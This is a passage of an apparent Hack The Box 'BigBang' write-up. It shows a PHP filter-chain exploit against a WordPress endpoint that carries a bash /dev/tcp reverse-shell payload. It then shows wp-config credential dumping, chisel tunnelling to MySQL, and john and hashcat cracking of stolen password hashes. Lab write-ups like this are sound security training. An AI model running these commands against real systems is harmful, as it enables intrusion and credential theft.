+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\0xkujen&gt; python3 cnext-exploit.py <span class="string">&#x27;http://blog.bigbang.htb/wp-admin/admin-ajax.php&#x27;</span> <span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.29/9001 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line">[*] Potential heaps: 0x7fd668400040, 0x7fd668200040, 0x7fd666e00040, 0x7fd664800040, 0x7fd664600040, 0x7fd663200040</span><br><span class="line">(using last one)</span><br><span class="line">HEAP address: 0x7fd668400040</span><br><span class="line">LIBC address: 0x7fd66b19f000</span><br><span class="line">Sending exploit...</span><br><span class="line">PATH:</span><br><span class="line">php://filter/read=zlib.inflate|zlib.inflate|dechunk|convert.iconv.L1.L1|dechunk|convert.iconv.L1.L1|dechunk|convert.icon</span><br><span class="line">v.L1.L1|dechunk|convert.iconv.UTF-8.ISO-2022-CN-EXT|convert.quoted-printable-decode|convert.iconv.L1.L1/resource=data:te</span><br><span class="line">xt/plain;<span class="built_in">base64</span>,e3vXt++xmQBbwLrXJlPWbrvKzXgyJe3aziYDZ8XtJ9RWyxiYn7ANElHv/pPDVNLg80OuY71H9NtlMS3bV4ky4AUNmjqnBcN3xi7tC917</span><br><span class="line">NC57ZrQKOwt+HQlCp4uOhOaFr0wOzd94PeqZ2ElGRvw6ZhzZJFM49Xboq4ir0W+2TtvpWuRAwAqt76ndq6+svrJx1VZ7xn390X+NKj9/fLvtemr86383vn3v</span><br><span class="line">//vz4/1f7pN7vn7/UrvvaMeT5wRc0PB/l3tvXNy2wGNZd5Pqr/zd+Xb7738V2/fXvznfX722ds+1v3d36cv/+1MVt//q/jj5k9t58Jv3/8Tfz18ZPv1+/prx</span><br><span class="line">yXf/5K8rj/3b877//bfj3vLnd91/VRf/7fduu8o9t+XXX999/+vTt3/r6veqvf4X9Dsi/nvp37+Pbv+LWOd/e1/Mnx3xk5/f31tae+7v4brqmPU1d+Rfb210</span><br><span class="line">n29//d/286+/7ps5p+bH4yeFvnnX6+y+ndn+7vq5/OSi2qJ4u/02dncN/vUrT5pvTsDnmTqnxcJXgmIre8rMv78++0+U4cevhaHtc0eP6eKtctFTPF0u1Y8q</span><br><span class="line">HlU8qpjOihte6m495rN9d8/uWtnUTqGThgTMnnEvKPtMye7TO25fD5ymMVGGmcrGXwvavsOrd33mbf2ddzXyH/3+dJZ//58ILxcLPgI6L0e9AhY/H01zfy91</span><br><span class="line">q0wWfGhBQL1P9sromKXHrm95O13qaa/rkXwA</span><br><span class="line"></span><br><span class="line">     EXPLOIT  SUCCESS</span><br><span class="line"></span><br><span class="line">PS C:\Users\0xkujen&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>And we are in:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\0xkujen&gt; nc -lvnp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.16.29] from (UNKNOWN) [10.10.11.52] 50590</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data@8e3a72b5e980:/var/www/html/wordpress/wp-admin$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">www-data@8e3a72b5e980:/var/www/html/wordpress/wp-admin$</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="Lateral-Movement-Database-Credentials-exfiltration"><a href="#Lateral-Movement-Database-Credentials-exfiltration" class="headerlink" title="Lateral Movement - Database Credentials exfiltration"></a>Lateral Movement - Database Credentials exfiltration</h4><p>Looking for database we files, we find our usual <code>wp-config.php</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">www-data@8e3a72b5e980:/var/www/html/wordpress$ <span class="built_in">cat</span> wp-config.php</span><br><span class="line"><span class="built_in">cat</span> wp-config.php</span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * The base configuration <span class="keyword">for</span> WordPress</span><br><span class="line"> *</span><br><span class="line"> * The wp-config.php creation script uses this file during the installation.</span><br><span class="line"> * You don<span class="string">&#x27;t have to use the website, you can copy this file to &quot;wp-config.php&quot;</span></span><br><span class="line"><span class="string"> * and fill in the values.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * This file contains the following configurations:</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * * Database settings</span></span><br><span class="line"><span class="string"> * * Secret keys</span></span><br><span class="line"><span class="string"> * * Database table prefix</span></span><br><span class="line"><span class="string"> * * ABSPATH</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @link https://wordpress.org/documentation/article/editing-wp-config-php/</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @package WordPress</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// ** Database settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="string">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_NAME<span class="string">&#x27;, &#x27;</span>wordpress<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Database username */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_USER<span class="string">&#x27;, &#x27;</span>wp_user<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Database password */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_PASSWORD<span class="string">&#x27;, &#x27;</span>wp_password<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Database hostname */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_HOST<span class="string">&#x27;, &#x27;</span>172.17.0.1<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Database charset to use in creating database tables. */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_CHARSET<span class="string">&#x27;, &#x27;</span>utf8mb4<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** The database collate type. Don&#x27;</span>t change this <span class="keyword">if</span> <span class="keyword">in</span> doubt. */</span><br><span class="line">define( <span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@+</span></span><br><span class="line"> * Authentication unique keys and salts.</span><br><span class="line"> *</span><br><span class="line"> * Change these to different unique phrases! You can generate these using</span><br><span class="line"> * the &#123;@<span class="built_in">link</span> https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;.</span><br><span class="line"> *</span><br><span class="line"> * You can change these at any point <span class="keyword">in</span> time to invalidate all existing cookies.</span><br><span class="line"> * This will force all <span class="built_in">users</span> to have to <span class="built_in">log</span> <span class="keyword">in</span> again.</span><br><span class="line"> *</span><br><span class="line"> * @since 2.6.0</span><br><span class="line"> */</span><br><span class="line">define( <span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;(6xl?]9=.f9(&lt;(yxpm9]5&lt;wKsyEc+y&amp;MV6CjjI(0lR2)_6SWDnzO:[g98nOOPaeK&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;F&lt;3&gt;KtCm^zs]Mxm Rr*N:&amp;&#123;SWQexFn@ wnQ+bTN5UCF-&lt;gMsT[mH$m))T&gt;BqL&#125;%8&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;:&#123;yhPsf&#125;tZRfMAut2$Fcne/.@Vs&gt;uukS&amp;JB04 Yy3&#123;`$`6p/Q=d^9=ZpkfP,o%l]&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;sC(jyKu&gt;gY(,&amp;: KS#Jh7x?/CB.hy8!_QcJhPGf@3q&lt;-a,D#?!b&#125;h8 ao;g[&lt;OW;&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;_B&amp; tL]9I?ddS! 0^_,4M)B&gt;aHOl&#123;&#125;e2P(l3=!./]~v#U&gt;dtF7zR=~LnJtLgh&amp;KK&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;&lt;Cqw6ztRM/y?eGvMzY(~d?:#]v)em`.H!SWbk.7Fj%b@Te&lt;r^^Vh3KQ~B2c|~VvZ&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;_zl+LT[GqIV&#123;*Hpv&gt;]H:&lt;U5oO[w:]?%Dh(s&amp;Tb-2k`1!WFqKu;elq7t^~v7zS&#123;n[&#x27;</span> );</span><br><span class="line">define( <span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;t2~PvIO1qeCEa^+J&#125;@h&amp;x&lt;%u~Ml&#123;=0Orqe]l+DD7S&#125;%KP&#125;yi(6v$mHm4cjsK,vCZ&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@-*/</span></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * WordPress database table prefix.</span><br><span class="line"> *</span><br><span class="line"> * You can have multiple installations <span class="keyword">in</span> one database <span class="keyword">if</span> you give each</span><br><span class="line"> * a unique prefix. Only numbers, letters, and underscores please!</span><br><span class="line"> */</span><br><span class="line"><span class="variable">$table_prefix</span> = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * For developers: WordPress debugging mode.</span><br><span class="line"> *</span><br><span class="line"> * Change this to <span class="literal">true</span> to <span class="built_in">enable</span> the display of notices during development.</span><br><span class="line"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class="line"> * <span class="keyword">in</span> their development environments.</span><br><span class="line"> *</span><br><span class="line"> * For information on other constants that can be used <span class="keyword">for</span> debugging,</span><br><span class="line"> * visit the documentation.</span><br><span class="line"> *</span><br><span class="line"> * @<span class="built_in">link</span> https://wordpress.org/documentation/article/debugging-in-wordpress/</span><br><span class="line"> */</span><br><span class="line">define( <span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span> );</span><br><span class="line"></span><br><span class="line">/* Add any custom values between this line and the <span class="string">&quot;stop editing&quot;</span> line. */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* That<span class="string">&#x27;s all, stop editing! Happy publishing. */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="string">if ( ! defined( &#x27;</span>ABSPATH<span class="string">&#x27; ) ) &#123;</span></span><br><span class="line"><span class="string">        define( &#x27;</span>ABSPATH<span class="string">&#x27;, __DIR__ . &#x27;</span>/<span class="string">&#x27; );</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="string">require_once ABSPATH . &#x27;</span>wp-settings.php<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure></div>
+
+
+<p>Which contains the credentials for <code>wp_user</code> (wp_user:wp_password) user which we can use the credentials for to port forward the mysql service (port 3306) and access it through our attacker machine. First let’s use chisel to forward the port 3306 to our attacker machine:<br>On our attacker machine:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.\chisel.exe server --reverse --port 9000</span><br><span class="line">2025/04/30 20:34:53 server: Reverse tunnelling enabled</span><br><span class="line">2025/04/30 20:34:53 server: Fingerprint 8PpEy0wTBndi3s68hgcLV15phmlm4UuuYe83zsk1JhE=</span><br><span class="line">2025/04/30 20:34:53 server: Listening on http://0.0.0.0:9000</span><br><span class="line">2025/04/30 20:35:24 server: session<span class="comment">#1: tun: proxy#R:3306=&gt;172.17.0.1:3306: Listening</span></span><br></pre></td></tr></table></figure></div>
+
+<p>And on the victim machine:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@8e3a72b5e980:/tmp$ ./chisel client 10.10.16.29:9000 R:3306:172.17.0.1:3306</span><br><span class="line">&lt;isel client 10.10.16.29:9000 R:3306:172.17.0.1:3306</span><br><span class="line">2025/04/30 19:35:06 client: Connecting to ws://10.10.16.29:9000</span><br><span class="line">2025/04/30 19:35:11 client: Connected (Latency 330.862016ms)</span><br></pre></td></tr></table></figure></div>
+
+<p>We can now use Mysql Workbench to connect using those credentials:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/BigBang/mysql.png"
+                      alt="MySQL Connection"
+                ><figcaption>MySQL Connection</figcaption></figure></p>
+<p>We can now execute the following commands to get the shawking user hash:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/BigBang/mysql1.png"
+                      alt="MySQL Connection"
+                ><figcaption>MySQL Connection</figcaption></figure></p>
+<p>Later we attempt to crack the hash using JohnTheRipper:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ john  --format=phpass -w=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])</span><br><span class="line">Cost 1 (iteration count) is 8192 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">quantumphysics   (?)     </span><br><span class="line">1g 0:00:02:33 DONE (2025-01-31 20:05) 0.006532g/s 29099p/s 29099c/s 29099C/s quarashi33..quanteka</span><br><span class="line">Use the <span class="string">&quot;--show --format=phpass&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure></div>
+<p>We can now use that to ssh into the box and claim our user flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shawking@bigbang:~$ <span class="built_in">id</span></span><br><span class="line">uid=1001(shawking) gid=1001(shawking) <span class="built_in">groups</span>=1001(shawking)</span><br><span class="line">shawking@bigbang:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">843380241da5d7490f87e3c709fbbbb2</span><br><span class="line">shawking@bigbang:~$</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Lateral-Movement-to-developer-Grafana-Database-Exfiltration"><a href="#Lateral-Movement-to-developer-Grafana-Database-Exfiltration" class="headerlink" title="Lateral Movement to developer - Grafana Database Exfiltration"></a>Lateral Movement to developer - Grafana Database Exfiltration</h3><p>Now looking at <code>/opt</code> directory we find an interesting <code>data</code> folder containing a <code>grafana.db</code> database file:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.1$ <span class="built_in">id</span></span><br><span class="line">uid=1001(shawking) gid=1001(shawking) <span class="built_in">groups</span>=1001(shawking)</span><br><span class="line">-bash-5.1$ <span class="built_in">ls</span></span><br><span class="line">csv  grafana.db  pdf  plugins  png</span><br></pre></td></tr></table></figure></div>
+
+<p>We can transfer that out to our attacker machine via scp and check it out:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">  ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ scp shawking@bigbang.htb:/opt/data/grafana.db .</span><br><span class="line">shawking@bigbang.htb<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">grafana.db                                                                        100%  980KB 267.1KB/s   00:03    </span></span><br><span class="line"><span class="string">                                                                                                                    </span></span><br><span class="line"><span class="string">┌──(kali㉿kali)-[~]</span></span><br><span class="line"><span class="string">└─$ file grafana.db </span></span><br><span class="line"><span class="string">grafana.db: SQLite 3.x database, last written using SQLite version 3044000, file counter 729, database pages 245, cookie 0x1bd, schema 4, UTF-8, version-valid-for 729</span></span><br><span class="line"><span class="string">                                                                                                                    </span></span><br><span class="line"><span class="string">┌──(kali㉿kali)-[~]</span></span><br><span class="line"><span class="string">└─$ sqlite3 grafana.db                             </span></span><br><span class="line"><span class="string">SQLite version 3.46.0 2024-05-23 13:25:27</span></span><br><span class="line"><span class="string">Enter &quot;.help&quot; for usage hints.</span></span><br><span class="line"><span class="string">sqlite&gt; .tables;</span></span><br><span class="line"><span class="string">Error: unknown command or invalid arguments:  &quot;tables;&quot;. Enter &quot;.help&quot; for help</span></span><br><span class="line"><span class="string">sqlite&gt; .tables</span></span><br><span class="line"><span class="string">alert                        library_element_connection </span></span><br><span class="line"><span class="string">alert_configuration          login_attempt              </span></span><br><span class="line"><span class="string">alert_configuration_history  migration_log              </span></span><br><span class="line"><span class="string">alert_image                  ngalert_configuration      </span></span><br><span class="line"><span class="string">alert_instance               org                        </span></span><br><span class="line"><span class="string">alert_notification           org_user                   </span></span><br><span class="line"><span class="string">alert_notification_state     permission                 </span></span><br><span class="line"><span class="string">alert_rule                   playlist                   </span></span><br><span class="line"><span class="string">alert_rule_tag               playlist_item              </span></span><br><span class="line"><span class="string">alert_rule_version           plugin_setting             </span></span><br><span class="line"><span class="string">annotation                   preferences                </span></span><br><span class="line"><span class="string">annotation_tag               provenance_type            </span></span><br><span class="line"><span class="string">anon_device                  query_history              </span></span><br><span class="line"><span class="string">api_key                      query_history_star         </span></span><br><span class="line"><span class="string">builtin_role                 quota                      </span></span><br><span class="line"><span class="string">cache_data                   role                       </span></span><br><span class="line"><span class="string">cloud_migration              secrets                    </span></span><br><span class="line"><span class="string">cloud_migration_run          seed_assignment            </span></span><br><span class="line"><span class="string">correlation                  server_lock                </span></span><br><span class="line"><span class="string">dashboard                    session                    </span></span><br><span class="line"><span class="string">dashboard_acl                short_url                  </span></span><br><span class="line"><span class="string">dashboard_provisioning       signing_key                </span></span><br><span class="line"><span class="string">dashboard_public             sso_setting                </span></span><br><span class="line"><span class="string">dashboard_snapshot           star                       </span></span><br><span class="line"><span class="string">dashboard_tag                tag                        </span></span><br><span class="line"><span class="string">dashboard_version            team                       </span></span><br><span class="line"><span class="string">data_keys                    team_member                </span></span><br><span class="line"><span class="string">data_source                  team_role                  </span></span><br><span class="line"><span class="string">entity_event                 temp_user                  </span></span><br><span class="line"><span class="string">file                         test_data                  </span></span><br><span class="line"><span class="string">file_meta                    user                       </span></span><br><span class="line"><span class="string">folder                       user_auth                  </span></span><br><span class="line"><span class="string">kv_store                     user_auth_token            </span></span><br><span class="line"><span class="string">library_element              user_role                  </span></span><br><span class="line"><span class="string">sqlite&gt; select * from user</span></span><br><span class="line"><span class="string">   ...&gt; ;</span></span><br><span class="line"><span class="string">1|0|admin|admin@localhost||441a715bd788e928170be7954b17cb19de835a2dedfdece8c65327cb1d9ba6bd47d70edb7421b05d9706ba6147cb71973a34|CFn7zMsQpf|CgJll8Bmss||1|1|0||2024-06-05 16:14:51|2024-06-05 16:16:02|0|2024-06-05 16:16:02|0|0|</span></span><br><span class="line"><span class="string">2|0|developer|ghubble@bigbang.htb|George Hubble|7e8018a4210efbaeb12f0115580a476fe8f98a4f9bada2720e652654860c59db93577b12201c0151256375d6f883f1b8d960|4umebBJucv|0Whk1JNfa3||1|0|0||2024-06-05 16:17:32|2025-01-20 16:27:39|0|2025-01-20 16:27:19|0|0|ednvnl5nqhse8d                                                                                  100%  980KB  24.3KB/s   00:40</span></span><br></pre></td></tr></table></figure></div>
+
+
+<p>We can see we have a few of hashes, we can crack <code>developer</code>‘s hash using Hashcat:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ hashcat -m 10900 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt </span><br><span class="line">hashcat (v6.2.6) starting</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="comment">#1 [The pocl project]</span></span><br><span class="line">============================================================================================================================================</span><br><span class="line">* Device <span class="comment">#1: cpu-sandybridge-AMD Ryzen 7 4800H with Radeon Graphics, 2212/4489 MB (1024 MB allocatable), 4MCU</span></span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line">* Slow-Hash-SIMD-LOOP</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Host memory required <span class="keyword">for</span> this attack: 1 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344385</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line"></span><br><span class="line">sha256:10000:NHVtZWJCSnVjdg==:foAYpCEO+66xLwEVWApHb+j5ik+braJyDmUmVIYMWduTV3sSIBwBUSVjddb4g/G42WA=:bigbang</span><br><span class="line">                                                          </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)</span><br><span class="line">Hash.Target......: sha256:10000:NHVtZWJCSnVjdg==:foAYpCEO+66xLwEVWApHb...G42WA=</span><br><span class="line">Time.Started.....: Fri Jan 31 20:28:03 2025 (4 secs)</span><br><span class="line">Time.Estimated...: Fri Jan 31 20:28:07 2025 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#1.........:     1694 H/s (7.22ms) @ Accel:256 Loops:128 Thr:1 Vec:8</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)</span><br><span class="line">Progress.........: 7168/14344385 (0.05%)</span><br><span class="line">Rejected.........: 0/7168 (0.00%)</span><br><span class="line">Restore.Point....: 6144/14344385 (0.04%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 